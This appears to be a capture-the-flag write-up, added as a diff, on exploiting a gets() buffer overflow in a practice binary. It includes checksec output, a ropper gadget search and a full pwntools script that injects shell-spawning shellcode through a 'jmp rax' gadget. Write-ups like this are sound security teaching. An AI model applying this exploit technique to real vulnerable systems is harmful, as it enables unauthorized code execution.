@@ -1,0 +1,75 @@
+I started with doing a quick reverse engineering of the binary, which showed that it was pretty straight forward. The main function just calls a vuln() function, which uses gets() to get input into a 256 byte long buffer.
+
+Since there was no function which printed the flag or anything else to indicate the flag was inside the binary I assumed this was a shellcode or ret2libc challenge. Since there was no libc file provided with the challenge I assumed it was shellcode. Checking the security of the file confirmed this:
+
+```
+$ checksec --file=vuln                                                                                                                                                                 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   65 Symbols	 No	0		1		vuln
+```
+
+- No Stack Canary -> Buffer overflow is possible
+- NX disabled -> We can execute code on the stack
+- No PIE -> The memory addresses in the executable don't change each time the binary runs
+
+These three in combination pretty much tells us that we need to inject shellcode through a buffer overflow, and that we can use hardcoded memory addresses both locally and on the remote.
+
+Initially I tested with this payload:
+
+```
+shellcode = b"A" * 256
+padding = b"B" * 8
+
+payload = flat(
+    shellcode,
+    padding,
+    p64(0x0000000000401156),
+)
+
+g.sendlineafter(b"input\n", payload)
+g.interactive()
+```
+
+Where the last address in the payload is the address to the vuln() function. the "shellcode" variable currently contains the bytes to do the buffer overflow, the padding variable is to write the base pointer, and then I place the address of the vuln() function below the base pointer, as the new return pointer.
+
+As expected this results in execution flowing back to vuln() after the `ret` instruction.
+
+So now I figured I need to put some shellcode at the start of the 256 byte long buffer filled with A's, and somehow get an address which pointed at the shellcode.
+
+I struggled a while with this, but after a tip I decided to check the ROP gadgets using ropper, which returned:
+
+```
+$ ropper -f vuln | grep rax
+0x00000000004010cc: jmp rax; 
+```
+
+This is perfect, since gets() (as well as every other function) places the return value in rax. In our case the payload will be in rax. Ultimately my solvescript looked like this:
+```
+from pwn import *
+
+context.log_level = "DEBUG"
+context.terminal = "kitty"
+context.arch = "amd64"
+
+elf = ELF("./vuln")
+#g = gdb.debug("./vuln", gdbscript="b *vuln+37")
+g = process("./vuln")
+
+
+shellcode = asm(shellcraft.sh())
+padding = b"A" * (256 - len(shellcode))
+jmp_rax = p64(0x00000000004010cc)
+
+payload = flat(
+    shellcode,
+    padding,
+    b"\x90" * 8,
+    jmp_rax
+)
+
+g.sendlineafter(b"input\n", payload)
+g.interactive()
+```
+
+To solve it on the remote I had to add the remote (obviously) and use g.send() instead of sendlineafter(), which probably is just due to buffering issues on the server
+
